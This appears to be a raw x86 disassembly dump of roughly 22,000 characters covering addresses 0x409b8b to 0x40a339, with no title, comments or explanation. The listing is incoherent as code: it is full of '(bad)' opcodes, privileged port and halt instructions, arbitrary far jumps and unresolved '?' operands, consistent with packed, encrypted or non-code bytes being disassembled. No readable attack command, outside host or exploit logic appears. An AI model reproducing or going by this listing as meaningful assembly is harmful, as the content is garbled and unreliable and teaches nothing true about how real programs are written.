  409b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b8c:	cmp    eax,0xc4d9015b
  409b91:	cs xor ax,0xaa83
  409b96:	cmp    eax,DWORD PTR [ebx-0x76a9efdc]
  409b9c:	inc    ebx
  409b9d:	push   0x25
  409b9f:	adc    BYTE PTR [eax],bl
  409ba1:	(bad)  [ebp-0x1fbffef1]
  409ba7:	cmp    al,0x2d
  409ba9:	test   DWORD PTR [esi-0x76],esp
  409bac:	cmp    al,BYTE PTR [eax]
  409bae:	mov    BYTE PTR [ebp+0x325701f9],cl
  409bb4:	jb     0x409b73
  409bb6:	fistp  WORD PTR [ecx]
  409bb8:	mov    ch,0xac
  409bbb:	stos   DWORD PTR es:[edi],eax
  409bbc:	rcl    BYTE PTR [esi+0x24],0x73
  409bc0:	push   edx
  409bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bc2:	add    DWORD PTR ds:0xafa5b97f,0x10e0a437
  409bcc:	jge    0x409b6e
  409bce:	mov    dh,0x14
  409bd0:	ficom  DWORD PTR [esi-0x52]
  409bd3:	neg    DWORD PTR [esi-0x28]
  409bd6:	data16 cmp BYTE PTR [ebx+ebp*2+0x6e],al
  409bdb:	or     DWORD PTR [eax+0x7e19860d],0xcf14913f
  409be5:	jecxz  0x409c18
  409be7:	popf   
  409be8:	push   ebx
  409be9:	mov    ah,BYTE PTR [edx+0x34691a52]
  409bef:	mov    al,ds:0xb6516ac2
  409bf4:	jle    0x409c16
  409bf6:	rol    DWORD PTR [edi-0x15],0x10
  409bfa:	gs xchg ecx,eax
  409bfc:	dec    edi
  409bfd:	jmp    0x409b91
  409bff:	add    edi,0x54cf1eca
  409c05:	imul   eax,DWORD PTR [eax-0x2827af26],0x9a114e3
  409c0f:	and    DWORD PTR [edx],0x55
  409c12:	fs push esi
  409c14:	pop    edi
  409c15:	int    0x45
  409c17:	pop    edi
  409c18:	ss jmp 0x1806:0x4913f381
  409c20:	jecxz  0x409c3d
  409c22:	mov    bh,BYTE PTR [ebp+ebp*4+0x33]
  409c26:	adc    DWORD PTR [ebx],eax
  409c28:	adc    eax,0x30bc2dd6
  409c2d:	jmp    0x409c68
  409c2f:	je     0x409bc7
  409c31:	xchg   ecx,ebx
  409c33:	bswap  edi
  409c35:	push   0x6a
  409c37:	lods   al,BYTE PTR ds:[esi]
  409c38:	pop    esi
  409c39:	lock mov al,ds:0xe5834a3
  409c3f:	ja     0x409ca9
  409c41:	shr    edx,0x4f
  409c44:	aas    
  409c45:	push   0x2
  409c47:	arpl   WORD PTR [ecx+0x34],si
  409c4a:	lahf   
  409c4b:	ja     0x409c7e
  409c4d:	inc    edx
  409c4e:	data16 std 
  409c50:	mov    edx,0x2918f626
  409c55:	neg    DWORD PTR [ecx-0x3e9fa3e7]
  409c5b:	jecxz  0x409c13
  409c5d:	dec    ebx
  409c5e:	sbb    edi,DWORD PTR [edx+0x53]
  409c61:	inc    eax
  409c62:	push   ecx
  409c63:	fdiv   QWORD PTR [esi-0x78]
  409c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c67:	ins    BYTE PTR es:[edi],dx
  409c68:	imul   eax,DWORD PTR cs:[ecx],0x72
  409c6c:	bnd jmp DWORD PTR [ecx+0x79ae09a8]
  409c73:	add    BYTE PTR [ebx+esi*8-0x79574fec],cl
  409c7a:	cwde   
  409c7b:	add    eax,0xc03a69b1
  409c80:	(bad)  
  409c81:	lods   eax,DWORD PTR ds:[esi]
  409c82:	mov    ch,0x15
  409c84:	mul    BYTE PTR [ecx-0x11]
  409c87:	jnp    0x409ced
  409c89:	out    dx,eax
  409c8a:	vrcpss xmm4,xmm4,DWORD PTR [esi+0x37]
  409c8f:	sahf   
  409c90:	sub    BYTE PTR [ebx+0x2c],0x19
  409c94:	pop    esp
  409c95:	bound  esi,QWORD PTR [esi+0x3bc97111]
  409c9b:	aaa    
  409c9c:	push   ebx
  409c9d:	cmp    ebx,esp
  409c9f:	dec    edi
  409ca0:	sbb    DWORD PTR [eax+edx*2],ecx
  409ca3:	adc    al,0x0
  409ca5:	jne    0x409c88
  409ca7:	mov    bh,0x83
  409ca9:	imul   ebx,DWORD PTR [esi-0x74],0xb16f5c63
  409cb0:	push   ebx
  409cb1:	mov    al,0xbe
  409cb3:	sub    esi,DWORD PTR [edi+0x39]
  409cb6:	mov    ds,WORD PTR [ecx+edi*8+0x20826a]
  409cbd:	pushf  
  409cbe:	inc    edi
  409cbf:	pushf  
  409cc0:	push   ecx
  409cc1:	mov    cl,0x79
  409cc3:	mov    esi,0xef0340c9
  409cc8:	mov    ds:0xccb82fb7,al
  409ccd:	adc    DWORD PTR [ebp+0x328b6b59],ebx
  409cd3:	popa   
  409cd4:	shl    BYTE PTR [edx+0x79],0x11
  409cd8:	jb     0x409d4d
  409cda:	xlat   BYTE PTR ds:[ebx]
  409cdb:	pop    ecx
  409cdc:	out    0xd0,eax
  409cde:	cmp    al,0xd4
  409ce0:	mov    ebx,esp
  409ce2:	lea    eax,[ebp+0x70]
  409ce5:	pop    es
  409ce6:	push   ecx
  409ce7:	nop
  409ce8:	xchg   ecx,eax
  409ce9:	(bad)  
  409cea:	jns    0x409c6d
  409cec:	xchg   ebp,eax
  409ced:	xor    edx,DWORD PTR [edi+0x76c24e28]
  409cf3:	add    BYTE PTR [esi+0x6a],0x21
  409cf7:	push   es
  409cf8:	jmp    0x807daef4
  409cfd:	mov    bh,BYTE PTR [ecx+0x20]
  409d00:	pop    ebx
  409d01:	jmp    0xc188:0xbe2b74e2
  409d08:	lea    esi,[edx-0x50afbc1c]
  409d0e:	inc    ebx
  409d0f:	es push eax
  409d11:	lahf   
  409d12:	pop    DWORD PTR [ecx+0x29ef3974]
  409d18:	jbe    0x409cca
  409d1a:	fcomp  DWORD PTR [ecx]
  409d1c:	rol    BYTE PTR [edi+0x51e80f61],cl
  409d22:	jmp    0xbfc8:0x7ac25396
  409d29:	and    BYTE PTR ds:0x506952e6,0x29
  409d30:	mov    al,0x88
  409d32:	adc    DWORD PTR [ebp-0x46993889],esi
  409d38:	adc    esi,esi
  409d3a:	push   edx
  409d3b:	pop    es
  409d3c:	fwait
  409d3d:	pop    ebp
  409d3e:	nop
  409d3f:	test   al,0x51
  409d41:	mov    eax,ds:0xd6f3cc96
  409d46:	icebp  
  409d47:	sub    eax,0x4779745b
  409d4c:	push   cs
  409d4d:	sbb    ah,BYTE PTR [esi-0x6d]
  409d50:	sbb    BYTE PTR [esi+edx*8+0x3a011cac],dh
  409d57:	cld    
  409d58:	rcl    DWORD PTR [esi-0x27],cl
  409d5b:	lods   al,BYTE PTR ds:[esi]
  409d5c:	hlt    
  409d5d:	mov    esp,DWORD PTR [edi+esi*8+0x42]
  409d61:	lods   eax,DWORD PTR ds:[esi]
  409d62:	repz ficomp DWORD PTR [edi]
  409d65:	repz jle 0x409d13
  409d68:	loopne 0x409dd4
  409d6a:	(bad)  
  409d6b:	mov    ebx,0x70c985e8
  409d70:	sub    ecx,eax
  409d72:	adc    dx,WORD PTR [esi]
  409d75:	jnp    0x409dcc
  409d77:	cmp    ebp,0xffffffaf
  409d7a:	sub    bl,ah
  409d7c:	push   ecx
  409d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d7e:	jns    0x409d5a
  409d80:	imul   ecx,DWORD PTR [ebx+0x40],0x72
  409d84:	jnp    0x409de1
  409d86:	data16 jns 0x409d2b
  409d89:	int    0x55
  409d8b:	add    eax,0xbac0992f
  409d90:	add    ah,ch
  409d92:	add    eax,0x69d1ac9b
  409d97:	out    dx,eax
  409d98:	or     eax,0xd6712eb7
  409d9d:	jmp    0x3f44:0x314e7dc3
  409da4:	loope  0x409e10
  409da6:	outs   dx,DWORD PTR ds:[esi]
  409da7:	xchg   ebp,eax
  409da8:	dec    edx
  409da9:	inc    esp
  409daa:	fist   WORD PTR [edi+0x2e7158b6]
  409db0:	(bad)  
  409db1:	call   0x9d95:0x9878db57
  409db8:	push   ebx
  409db9:	sub    eax,0xdf7e7614
  409dbe:	repz sbb DWORD PTR [eax-0x2a2ff828],esp
  409dc5:	daa    
  409dc6:	push   esp
  409dc7:	test   al,0x53
  409dc9:	cmp    eax,0x5a325bdf
  409dce:	rcr    BYTE PTR [ebx+0x51bc6b21],cl
  409dd4:	into   
  409dd5:	dec    edx
  409dd6:	mov    esi,0x4867b9e5
  409ddb:	cmp    BYTE PTR [eax+0x43184d8d],bh
  409de1:	mov    BYTE PTR [ebx-0x37],ah
  409de4:	out    dx,eax
  409de5:	push   0x57
  409de7:	mov    cl,0xc5
  409de9:	mov    dl,0x83
  409deb:	xlat   BYTE PTR ds:[ebx]
  409dec:	jo     0x409de1
  409dee:	popw   ss
  409df0:	repnz dec ebx
  409df2:	in     eax,0x1f
  409df4:	fdiv   DWORD PTR [ebx+0x6ae39d31]
  409dfa:	scas   al,BYTE PTR es:[edi]
  409dfb:	push   ebx
  409dfc:	jl     0x409e73
  409dfe:	ss test al,0xd7
  409e01:	test   BYTE PTR [eax-0x6b],cl
  409e04:	in     eax,0x34
  409e06:	and    DWORD PTR [ecx],0xffffffe9
  409e09:	ret    
  409e0a:	and    bl,BYTE PTR [ecx]
  409e0c:	nop
  409e0d:	mov    bh,0x96
  409e0f:	add    eax,0x45389139
  409e14:	add    edi,DWORD PTR [esi]
  409e16:	data16 fstp TBYTE PTR [ebp+eax*2-0x37]
  409e1b:	adc    edx,ecx
  409e1d:	or     DWORD PTR ds:0x66ca7793,ecx
  409e23:	test   al,0x48
  409e25:	dec    ecx
  409e26:	push   eax
  409e27:	xchg   ecx,eax
  409e28:	jg     0x409e5a
  409e2a:	dec    ecx
  409e2b:	sbb    ebx,ecx
  409e2d:	pop    esi
  409e2e:	add    BYTE PTR [esi-0x6dbbb9d],dl
  409e34:	sub    ebx,esi
  409e36:	call   0xc5b8:0xd2db2819
  409e3d:	ja     0x409e8a
  409e3f:	out    0x54,al
  409e41:	add    al,0xcf
  409e43:	out    dx,al
  409e44:	sub    dl,BYTE PTR [eax-0x1a]
  409e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e48:	data16 rcr BYTE PTR [ecx+0x35],cl
  409e4c:	push   ds
  409e4d:	push   es
  409e4e:	aaa    
  409e4f:	mov    esp,0xe1c0732c
  409e54:	inc    eax
  409e55:	adc    al,0x6e
  409e57:	mov    ah,0x3a
  409e59:	ret    0xea67
  409e5c:	aas    
  409e5d:	xchg   ebp,eax
  409e5e:	jl     0x409eab
  409e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e61:	or     al,0xb6
  409e63:	or     al,0xb5
  409e65:	push   0xffffff9e
  409e67:	in     eax,dx
  409e68:	cld    
  409e69:	mov    BYTE PTR [eax],bl
  409e6b:	pop    ss
  409e6c:	or     BYTE PTR [edx+ecx*1-0x3b],al
  409e70:	jmp    0x409e58
  409e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e73:	mov    DWORD PTR [ebp+0x13bd8b2d],0x3019fe9c
  409e7d:	ins    BYTE PTR es:[edi],dx
  409e7e:	cmp    al,0xe1
  409e80:	jns    0x409ea0
  409e82:	push   es
  409e83:	push   esp
  409e84:	inc    ebp
  409e85:	fcom   QWORD PTR [edx-0x6c]
  409e88:	push   ebx
  409e89:	dec    ebx
  409e8a:	xchg   edi,eax
  409e8b:	icebp  
  409e8c:	in     al,dx
  409e8d:	ror    BYTE PTR [ebp-0x329534a0],0x9f
  409e94:	and    DWORD PTR [ecx+ebp*2+0x79191a8b],ecx
  409e9b:	inc    edx
  409e9c:	and    BYTE PTR [ecx+0x1b],ch
  409e9f:	pop    ebp
  409ea0:	sbb    al,0xf4
  409ea2:	jae    0x409ebf
  409ea4:	out    dx,al
  409ea5:	inc    ebp
  409ea6:	leave  
  409ea7:	psrlw  mm3,QWORD PTR [si+0x530f]
  409ead:	lock sbb ebp,esi
  409eb0:	dec    ebx
  409eb1:	test   esi,0x8c69837f
  409eb7:	shl    BYTE PTR [ebp+0xa],cl
  409eba:	dec    ecx
  409ebb:	and    ch,al
  409ebd:	loop   0x409f25
  409ebf:	pop    ebp
  409ec0:	neg    dh
  409ec2:	mov    esi,0x15619621
  409ec7:	sbb    esp,DWORD PTR [esi+ecx*4]
  409eca:	push   ecx
  409ecb:	push   ecx
  409ecc:	and    dh,dh
  409ece:	adc    DWORD PTR [ebp-0x4cb66cad],ebx
  409ed4:	cmp    BYTE PTR [eax+eiz*2],0x28
  409ed8:	push   es
  409ed9:	mov    ebp,0x961c1930
  409ede:	fcomip st,st(5)
  409ee0:	jne    0x409efe
  409ee2:	arpl   WORD PTR [ecx+0x49],dx
  409ee5:	and    BYTE PTR [esi-0x5d],0xac
  409ee9:	cmp    BYTE PTR [ebp+0x4c],bl
  409eec:	pop    ss
  409eed:	inc    BYTE PTR [ebp+0x18]
  409ef0:	sbb    ebx,DWORD PTR [esi-0x6f5ac01a]
  409ef6:	mov    esi,ebx
  409ef8:	push   ebx
  409ef9:	popa   
  409efa:	(bad)  
  409efb:	pop    ds
  409efc:	xor    cl,ah
  409efe:	inc    edx
  409eff:	cmc    
  409f00:	ret    
  409f01:	push   0x36
  409f03:	push   edi
  409f04:	cs mov bl,0x32
  409f07:	enter  0x9523,0x71
  409f0b:	popa   
  409f0c:	pop    ebp
  409f0d:	mov    al,0x85
  409f0f:	int    0x2
  409f11:	ins    BYTE PTR es:[edi],dx
  409f12:	fidivr DWORD PTR [ebp+0xf]
  409f15:	push   edi
  409f16:	cmp    dl,ah
  409f18:	inc    edi
  409f19:	jmp    0x5ae:0x83dee623
  409f20:	jge    0x409f4b
  409f22:	data16 daa 
  409f24:	mov    edx,?
  409f26:	inc    ecx
  409f27:	lods   eax,DWORD PTR ds:[esi]
  409f28:	retf   0xb855
  409f2b:	popa   
  409f2c:	in     al,dx
  409f2d:	add    eax,0x8d5caf64
  409f32:	daa    
  409f33:	loop   0x409f27
  409f35:	stc    
  409f36:	or     ah,bl
  409f38:	pop    ecx
  409f39:	sub    al,0x66
  409f3b:	xchg   ebp,eax
  409f3c:	pop    ss
  409f3d:	gs out dx,eax
  409f3f:	add    DWORD PTR [esi+edx*1+0x45],ecx
  409f43:	sbb    cl,dl
  409f45:	test   ebx,esi
  409f47:	mov    edi,0x80a37c7c
  409f4c:	push   ebx
  409f4d:	loopne 0x409f4f
  409f4f:	add    BYTE PTR [ecx-0x384c51cb],dh
  409f55:	push   0x2e
  409f57:	repz sub ch,BYTE PTR [ebp-0x14bbe35b]
  409f5e:	mov    cs,WORD PTR [ecx+0x3]
  409f61:	add    edi,DWORD PTR [ecx-0x4f]
  409f64:	mov    edi,0x1564d9ce
  409f69:	xlat   BYTE PTR ds:[ebx]
  409f6a:	jp     0x409f84
  409f6c:	outs   dx,BYTE PTR ds:[esi]
  409f6d:	push   cs
  409f6e:	addr16 dec ebp
  409f70:	mov    eax,0x72b9f0de
  409f75:	mov    WORD PTR [ecx-0x61],?
  409f78:	pop    es
  409f79:	sbb    BYTE PTR ds:0x61cb0d34,bh
  409f7f:	sbb    BYTE PTR [esi-0x5e3e1aa0],bh
  409f85:	push   esp
  409f86:	or     ebx,edx
  409f88:	add    esi,edx
  409f8a:	add    ebp,ebx
  409f8c:	push   es
  409f8d:	(bad)  
  409f8e:	test   WORD PTR [ebx+0x6f],si
  409f92:	jle    0x409f9e
  409f94:	fadd   QWORD PTR ds:0xf9a1fa8e
  409f9a:	jge    0x409f49
  409f9c:	or     al,bh
  409f9e:	push   ebp
  409f9f:	aad    0xeb
  409fa1:	stos   BYTE PTR es:[edi],al
  409fa2:	popf   
  409fa3:	push   esi
  409fa4:	addr16 jnp 0x409f8b
  409fa7:	rcl    DWORD PTR es:[ecx+edi*1-0x6b],cl
  409fac:	add    ebp,DWORD PTR ds:0x9fc919bc
  409fb2:	ja     0x409f85
  409fb4:	push   es
  409fb5:	data16 (bad) 
  409fb7:	add    al,0x66
  409fb9:	rcl    BYTE PTR [eax],0x5a
  409fbc:	push   ebx
  409fbd:	(bad)  
  409fbe:	pop    edx
  409fbf:	imul   eax,DWORD PTR [edx-0x25e7902c],0x63
  409fc6:	ins    DWORD PTR es:[edi],dx
  409fc7:	in     eax,0xc0
  409fc9:	xchg   edx,eax
  409fca:	push   ecx
  409fcb:	jg     0x40a020
  409fcd:	add    dl,dl
  409fcf:	xlat   BYTE PTR ds:[ebx]
  409fd0:	imul   ebx,ecx,0x6b2eae34
  409fd6:	test   BYTE PTR [ecx-0x2],bl
  409fd9:	push   edx
  409fda:	test   BYTE PTR [eax+0x5],dl
  409fdd:	fisub  DWORD PTR [esi+0x1e]
  409fe0:	mov    bl,0xc6
  409fe2:	and    BYTE PTR [edi-0x453adcbb],ch
  409fe8:	mov    bh,0x12
  409fea:	mov    edx,DWORD PTR [esi-0x670ab393]
  409ff0:	call   0x53673dff
  409ff5:	xor    al,0x90
  409ff7:	scas   eax,DWORD PTR es:[edi]
  409ff8:	pop    edx
  409ff9:	out    dx,al
  409ffa:	push   edx
  409ffb:	xor    edi,DWORD PTR [ebp+0x69]
  409ffe:	es lock mov al,0x70
  40a002:	dec    esp
  40a003:	leave  
  40a004:	mov    BYTE PTR [esi+eiz*2+0x73],al
  40a008:	adc    al,0x7
  40a00a:	jb     0x409fb6
  40a00c:	pop    es
  40a00d:	xor    eax,0xefe6d681
  40a012:	sub    al,0x84
  40a014:	inc    ebx
  40a015:	loope  0x40a029
  40a017:	aaa    
  40a018:	in     al,0xf0
  40a01a:	data16 add al,0xf
  40a01d:	cmp    esi,edx
  40a01f:	jg     0x40a075
  40a021:	mov    ds:0x112a19e7,al
  40a026:	jg     0x40a076
  40a028:	and    ecx,ebx
  40a02a:	ds jmp 0x49f6:0x737a2353
  40a032:	mov    dl,0x24
  40a034:	or     al,0x1a
  40a036:	jno    0x40a09a
  40a038:	cmp    eax,0xb725c629
  40a03d:	xor    eax,0x6053c195
  40a042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a043:	cmp    eax,0xa4932188
  40a048:	jecxz  0x40a063
  40a04a:	mov    ebp,0x198c8e36
  40a04f:	cmp    al,0x9d
  40a051:	push   cs
  40a052:	stos   DWORD PTR es:[edi],eax
  40a053:	fs push ebx
  40a055:	sbb    BYTE PTR [ecx+eax*4+0x1e],bl
  40a059:	sbb    eax,0x6aced5b5
  40a05e:	mov    eax,0x1972a700
  40a063:	xchg   ebp,eax
  40a064:	and    DWORD PTR [esi-0x40c09b9a],ebx
  40a06a:	xchg   ebx,eax
  40a06b:	push   ebp
  40a06c:	icebp  
  40a06d:	ins    BYTE PTR es:[edi],dx
  40a06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a06f:	sbb    DWORD PTR [ebp+0x79],ebp
  40a072:	imul   esi,DWORD PTR [esi],0x24
  40a075:	not    DWORD PTR [ecx-0x6d]
  40a078:	aas    
  40a079:	(bad)  
  40a07a:	data16 aad 0x59
  40a07d:	jle    0xb92867b5
  40a083:	xchg   DWORD PTR [ecx+0x69],esp
  40a086:	pop    ds
  40a087:	int3   
  40a088:	add    DWORD PTR [ebp-0x5cc9fdc],edi
  40a08e:	gs enter 0x4e0a,0x84
  40a093:	clc    
  40a094:	adc    al,0xfb
  40a096:	or     ah,BYTE PTR [esi+eax*2]
  40a099:	nop
  40a09a:	add    DWORD PTR [ebx],ebx
  40a09c:	(bad)  
  40a09e:	cmp    ch,BYTE PTR [esi+0x3004e515]
  40a0a4:	push   ebx
  40a0a5:	lods   eax,DWORD PTR ds:[esi]
  40a0a6:	or     cl,bl
  40a0a8:	out    dx,eax
  40a0a9:	mov    ah,0xdf
  40a0ab:	mov    esi,0x69386af9
  40a0b0:	repz in eax,dx
  40a0b2:	xchg   ebx,eax
  40a0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b4:	and    ecx,esp
  40a0b6:	sbb    ax,di
  40a0b9:	ret    
  40a0ba:	fcmovnu st,st(5)
  40a0bc:	fcmovnu st,st(5)
  40a0be:	call   FWORD PTR [ecx]
  40a0c0:	rcr    BYTE PTR [ebx-0x58161fae],0x3
  40a0c7:	cdq    
  40a0c8:	push   eax
  40a0c9:	and    BYTE PTR [eax-0xe1ddc11],dh
  40a0cf:	push   ss
  40a0d0:	xchg   ebp,eax
  40a0d1:	out    dx,eax
  40a0d2:	push   edx
  40a0d3:	adc    esp,DWORD PTR [ecx+ebp*2-0x21]
  40a0d7:	xchg   esi,eax
  40a0d8:	fcom   DWORD PTR [edx-0x14]
  40a0db:	daa    
  40a0dc:	retf   
  40a0dd:	mov    ?,WORD PTR [ecx-0x79]
  40a0e0:	and    eax,0xef838681
  40a0e5:	sahf   
  40a0e6:	and    DWORD PTR es:[edx+ebp*2-0x7e],ebx
  40a0eb:	cmp    BYTE PTR [edx],bl
  40a0ed:	pop    edi
  40a0ee:	lea    edx,[edx+eiz*2+0x53bd2b45]
  40a0f5:	mov    eax,0x3f494d51
  40a0fa:	fidiv  WORD PTR [ebx+0x77fe6959]
  40a100:	and    al,0x3b
  40a102:	inc    edi
  40a103:	(bad)  
  40a104:	outs   dx,DWORD PTR ds:[esi]
  40a105:	mov    esp,0x2353f3fb
  40a10a:	cmp    ch,dl
  40a10c:	(bad)  
  40a10e:	sbb    esi,DWORD PTR [edi]
  40a110:	inc    ebx
  40a111:	push   0xffffffba
  40a113:	lods   al,BYTE PTR ds:[esi]
  40a114:	fsub   DWORD PTR [ecx+0x69]
  40a117:	cmp    DWORD PTR [esi+ecx*1+0x66],0x5bd51eb0
  40a11f:	test   eax,0x1b10de14
  40a124:	adc    eax,0x90735b7a
  40a129:	int    0x80
  40a12b:	mov    bh,0x53
  40a12d:	mov    dl,0x9c
  40a12f:	out    dx,al
  40a130:	addr16 dec edx
  40a132:	inc    esi
  40a133:	int3   
  40a134:	out    dx,al
  40a135:	xchg   edi,eax
  40a136:	outs   dx,DWORD PTR ds:[esi]
  40a137:	stos   DWORD PTR es:[edi],eax
  40a138:	sbb    DWORD PTR [ecx-0x35],ebx
  40a13b:	inc    esi
  40a13c:	and    eax,0x7593b92b
  40a141:	sahf   
  40a142:	and    BYTE PTR [esi+0x55f7f355],0xff
  40a149:	or     esi,DWORD PTR [edi]
  40a14b:	(bad)  
  40a14c:	jmp    0x40a11c
  40a14e:	push   esi
  40a14f:	enter  0x6efa,0xa2
  40a153:	xchg   DWORD PTR [esi+0x2f],ebx
  40a156:	imul   ecx,DWORD PTR [esi+0x53],0xcee65df9
  40a15d:	mov    ecx,0x4153d356
  40a162:	inc    DWORD PTR [ecx-0x15104e0d]
  40a168:	lods   eax,DWORD PTR ds:[esi]
  40a169:	add    al,0xb5
  40a16b:	xchg   esi,eax
  40a16c:	js     0x40a0f8
  40a16e:	fwait
  40a16f:	mov    DWORD PTR [ebx],eax
  40a171:	and    BYTE PTR [edx],0xa
  40a174:	push   ebx
  40a175:	jo     0x40a11c
  40a177:	mov    dh,0xbf
  40a179:	gs gs mov eax,0x7b976a48
  40a180:	xor    al,0xb0
  40a182:	mov    ecx,0x79ab7cfa
  40a187:	adc    ch,BYTE PTR [ecx]
  40a189:	mov    ch,0x2f
  40a18b:	jo     0x40a176
  40a18d:	cmp    eax,0xd314d4dc
  40a192:	loope  0x40a1aa
  40a194:	sub    BYTE PTR [ecx],dl
  40a196:	jno    0x40a147
  40a198:	das    
  40a199:	out    dx,eax
  40a19a:	ret    0xf35a
  40a19d:	mov    ebx,DWORD PTR [edx]
  40a19f:	xor    al,0xc4
  40a1a1:	sbb    DWORD PTR [edx],edx
  40a1a3:	leave  
  40a1a4:	enter  0xf966,0x47
  40a1a8:	mov    edi,0x5364d4b8
  40a1ad:	in     eax,0x91
  40a1af:	cdq    
  40a1b0:	jge    0x40a1eb
  40a1b2:	test   DWORD PTR [eax-0x15c395b7],esp
  40a1b8:	jl     0x40a173
  40a1ba:	pop    dx
  40a1bc:	jmp    0x663408ae
  40a1c1:	mov    ch,0x5a
  40a1c3:	cmp    DWORD PTR [ecx+0x6a19d374],0x9d836b33
  40a1cd:	mov    ebx,DWORD PTR [esi+0x660e2dde]
  40a1d3:	inc    ebx
  40a1d4:	sbb    edx,ebx
  40a1d6:	sub    bl,BYTE PTR [edi+0x19fcf252]
  40a1dc:	push   ss
  40a1dd:	dec    esp
  40a1de:	add    ebp,DWORD PTR [ebp+eiz*1+0x54b89f65]
  40a1e5:	pop    eax
  40a1e6:	aas    
  40a1e7:	adc    esp,DWORD PTR [ebx]
  40a1e9:	imul   edx,DWORD PTR [esi-0x563b54f7],0x19
  40a1f0:	jo     0x40a1b3
  40a1f2:	bound  eax,QWORD PTR [edx-0x4c8593ff]
  40a1f8:	push   eax
  40a1f9:	jbe    0x40a211
  40a1fb:	mov    dl,BYTE PTR [eax]
  40a1fd:	add    DWORD PTR [ecx+ebp*1],edi
  40a200:	ins    BYTE PTR es:[edi],dx
  40a201:	not    DWORD PTR [ecx-0x44]
  40a204:	sbb    ch,BYTE PTR [eax]
  40a206:	fldenv ds:[edx+0x5e0ea31d]
  40a20d:	gs jns 0x40a248
  40a210:	sbb    BYTE PTR [ebx],cl
  40a212:	rcr    bh,0x36
  40a215:	in     eax,0x3
  40a217:	sbb    eax,0x3d196aba
  40a21c:	fstp   DWORD PTR [esi-0x1a]
  40a21f:	mov    BYTE PTR [ecx],0x38
  40a222:	cmp    BYTE PTR [ecx],bh
  40a224:	adc    DWORD PTR [edx-0xa],ecx
  40a227:	mov    al,BYTE PTR [esi+0x6a]
  40a22a:	mov    al,ds:0xdfcb4a2e
  40a22f:	sti    
  40a230:	jmp    FWORD PTR [edx+0x5b]
  40a233:	ss inc esi
  40a235:	xchg   ebp,eax
  40a236:	pusha  
  40a237:	sti    
  40a238:	bt     DWORD PTR [edi+0x27],0xd3
  40a23d:	sbb    BYTE PTR [ebx+0x1d],dh
  40a240:	lods   al,BYTE PTR ds:[esi]
  40a241:	sub    DWORD PTR [edx+0x23],eax
  40a244:	mov    ebx,0x131b64a2
  40a249:	mov    dh,0x92
  40a24b:	mov    edx,ebp
  40a24d:	loopne 0x40a25d
  40a24f:	andps  xmm0,xmm0
  40a252:	imul   eax,DWORD PTR [ecx-0x4d],0x22d03128
  40a259:	jmp    0xd4eb:0xd7dd6306
  40a260:	or     eax,0x7d85f89e
  40a265:	or     DWORD PTR [esi+0x48deb608],esi
  40a26b:	adc    BYTE PTR [ecx-0x6f],dl
  40a26e:	popf   
  40a26f:	jns    0x40a21d
  40a271:	mov    eax,ebp
  40a273:	cmp    DWORD PTR [ecx+ebp*2-0x59],esp
  40a277:	dec    edx
  40a278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a279:	push   edi
  40a27a:	inc    ecx
  40a27b:	aad    0x96
  40a27d:	lock retfw 0xb916
  40a282:	sti    
  40a283:	pop    ds
  40a284:	outs   dx,BYTE PTR ds:[esi]
  40a285:	out    0x4c,eax
  40a287:	mov    esp,0x935814fe
  40a28c:	xchg   ecx,eax
  40a28d:	cmp    eax,0x23eba746
  40a292:	push   esi
  40a293:	out    0xb9,eax
  40a295:	mov    esp,0xa115f109
  40a29a:	jns    0x40a234
  40a29c:	sbb    bh,cl
  40a29e:	mov    ds:0x9cc5efbe,al
  40a2a3:	sbb    DWORD PTR [edx-0x24f9eb3],ecx
  40a2a9:	das    
  40a2aa:	inc    ecx
  40a2ab:	rcl    DWORD PTR [edx+0x44],cl
  40a2ae:	out    0xd2,al
  40a2b0:	sub    BYTE PTR [edx+0x473fb28d],cl
  40a2b6:	ret    0x9619
  40a2b9:	iret   
  40a2ba:	mov    ah,0x7d
  40a2bc:	add    DWORD PTR [ecx+0x6b],0xc86a53f5
  40a2c3:	out    0xa5,al
  40a2c5:	xor    al,0xa6
  40a2c7:	dec    ecx
  40a2c8:	pop    edx
  40a2c9:	imul   eax,ecx,0xb9c4fc18
  40a2cf:	xor    al,0x7a
  40a2d1:	push   edi
  40a2d2:	pushw  ss
  40a2d4:	push   esi
  40a2d5:	xor    eax,0xfd4f2651
  40a2da:	call   0x243d87f8
  40a2df:	xchg   ebp,eax
  40a2e0:	out    0x80,al
  40a2e2:	fiadd  DWORD PTR [ebp-0xe]
  40a2e5:	enter  0x89a6,0x44
  40a2e9:	repz push edx
  40a2eb:	xor    BYTE PTR [ebp+0x4b],0xb1
  40a2ef:	pop    eax
  40a2f0:	push   ebx
  40a2f1:	dec    edi
  40a2f2:	xor    bl,dl
  40a2f4:	(bad)  
  40a2f5:	ror    BYTE PTR [ebx+ebx*1],cl
  40a2f8:	fist   WORD PTR [edi-0x37b7fa21]
  40a2fe:	mov    dh,BYTE PTR [edi+0x53]
  40a301:	adc    al,0x82
  40a303:	lods   eax,DWORD PTR ds:[esi]
  40a304:	or     BYTE PTR [eax+0x71],al
  40a307:	jge    0x40a36e
  40a309:	xchg   ecx,eax
  40a30a:	sub    ebx,DWORD PTR [ecx]
  40a30c:	lds    edi,FWORD PTR [eax+0x46]
  40a30f:	imul   ebp,DWORD PTR [edx+0x535c7e94],0x1a85a0ab
  40a319:	out    dx,al
  40a31a:	sub    al,0x37
  40a31c:	iret   
  40a31d:	push   0xffffffc8
  40a31f:	rol    DWORD PTR [edi],0x41
  40a322:	jb     0x40a386
  40a324:	xchg   esi,eax
  40a325:	daa    
  40a326:	pushfw 
  40a328:	cwde   
  40a329:	(bad)  
  40a32a:	gs inc ebp
  40a32c:	in     al,0x4a
  40a32e:	aas    
  40a32f:	sbb    esi,edx
  40a331:	jae    0x40a2f1
  40a333:	imul   esi,DWORD PTR [esi+edi*2+0x5a],0x61
  40a338:	dec    ebx
  40a339:	sbb    DWORD PTR [eax-0x51],esi
